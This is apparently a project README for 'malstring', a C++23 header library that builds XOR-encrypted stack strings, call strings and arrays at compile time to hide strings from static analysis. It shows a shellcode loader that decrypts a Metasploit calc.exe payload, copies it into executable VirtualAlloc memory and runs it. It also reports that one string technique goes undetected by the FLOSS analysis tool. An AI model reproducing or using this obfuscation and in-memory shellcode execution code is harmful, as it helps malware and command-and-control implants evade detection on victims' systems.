# malstring
Using c++23 compile-time magic to produce obfuscated PIC strings and arrays.

## Stack strings
Probably you already know the following code will force runtime construction of string "Stack string" on the stack.
```c++
#include <cstdio>

int main() {
    char stack_string[] = {'S', 't', 'a', 'c', 'k', ' ', 's', 't', 'r', 'i', 'n', 'g', '\0'};

    printf(stack_string);
}
```

[https://godbolt.org/z/hPYEnjn3s](https://godbolt.org/z/hPYEnjn3s)

This method is useful if you want to generate PIC code without using an .rdata section to store strings, or simply hide strings from static string search tools.

The only problem with this. Writing each string this way is extremely inconvenient. Also it's less readable.
This problem is especially evident when you want to encrypt stack string in compile time.

My library, using various metaprogramming tricks, produces compile-time XOR-encrypted stack strings without losing readability and convenience.
For each string it is possible to use its own XOR key.

```c++
StackString<"Null-terminated Stack String", RAND()> ss;
pm.EncryptDecrypt(); // don't forget to decrypt the string before using it
std::cout << ss.Buf << '\n';
pm.EncryptDecrypt(); // encrypt again after use

StackString<"Stack String without null terminator", RAND(), false> ss2;
pm2.EncryptDecrypt();
std::cout << ss2.Buf << '\n';
pm2.EncryptDecrypt();
```

[https://godbolt.org/z/dGePWeoaa](https://godbolt.org/z/dGePWeoaa)


## Call Strings

I found this technique in [HAVOC](https://github.com/HavocFramework/Havoc) C2 framework.

```c++
#include <cstdio>

#if (defined(_MSC_VER))
#define NOINLINE __declspec(noinline)
#else
#define NOINLINE __attribute__((noinline))
#endif


NOINLINE char SymH() {
	return 'H';
}
NOINLINE char SymE() {
	return 'E';
}
NOINLINE char SymL() {
	return 'L';
}
NOINLINE char SymO() {
	return 'O';
}
NOINLINE char SymNULL() {
	return '\0';
}


int main() {
    char Hello[6];
    Hello[0] = SymH();
	Hello[1] = SymE();
	Hello[2] = SymL();
	Hello[3] = SymL();
	Hello[4] = SymO();
	Hello[5] = SymNULL();
    
    printf("%s\n", Hello);
}
```
gcc optimizes all calls, so optimization must be disabled. Msvc works well even with optimization enabled.
[https://godbolt.org/z/4TGso8heb](https://godbolt.org/z/4TGso8heb)


My library also provides the ability to create XOR-encrypted call strings in a much more convenient way.

```c++
    CallString<"Null-terminated Call String", RAND()> cs;
	cs.EncryptDecrypt(); // don't forget to decrypt the string before using it
	printf(cs.Buf);
	cs.EncryptDecrypt(); // encrypt again after use

    CallString<"Call String without null terminator", RAND()> cs2;
	cs2.EncryptDecrypt();
	printf(cs2.Buf);
	cs2.EncryptDecrypt();

```
[https://godbolt.org/z/8n49Knov3](https://godbolt.org/z/8n49Knov3)

## Call Array

You can store more than just strings. This library also provides a way to store arrays.
This code demonstrates how to call the Metasploit shellcode, which launches Calc.exe

```c++
int main()
{
	constexpr std::array<std::uint8_t, 108> shellcode {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C,
		0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74,
		0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE,
		0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0x0C, 0xCC, 0xCC,
	};
	
	CallArray<shellcode.size(), shellcode, RAND()> calc;
	calc.EncryptDecrypt();
	
	const auto alloc = VirtualAlloc(0, sizeof(calc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	memcpy(alloc, calc.Buf, sizeof(calc));
	
	((void (*)())alloc)();

	calc.EncryptDecrypt();
}

```

You can even pass hex string instead of constexpr array.

``` c++
int main()
{


	CallArrayFromHex<"53 56 57 55 54 58 66 83 E4 F0 50 6A 60 5A 68 63 61 6C "
	                 "63 54 59 48 29 D4 65 48 8B 32 48 8B 76 18 48 8B 76 10 48 AD "
	                 "48 8B 30 48 8B 7E 30 03 57 3C 8B 5C 17 28 8B 74 1F 20 48 01 FE 8B 54 "
	                 "1F 24 0F B7 2C 17 8D 52 02 AD 81 3C 07 57 69 6E 45 75 EF 8B 74 1F 1C "
	                 "48 01 FE 8B 34 AE 48 01 F7 99 FF D7 48 83 C4 68 5C 5D 5F 5E 5B 0C "
	                 "CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC", RAND()> calc;

	calc.EncryptDecrypt();
	
	const auto alloc = VirtualAlloc(0, sizeof(calc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	memcpy(alloc, calc.Buf, sizeof(calc));
	
	((void (*)())alloc)();

	calc.EncryptDecrypt();
}

```
The only limitation of this method is EXTREMELY long compilation time for large arrays. A 1kb shellcode takes about 30 minutes compilation time.

## Detection
I tested StackString and CallString with [FLOSS](https://github.com/mandiant/flare-floss)
The StackString is sometimes detectable as "Tight string" (runtime decrypted stack string)
CallString is undetectable.

## Usage
Just copy header into your project. set c++ standard to c++23 or latest.
CRT isn't required.
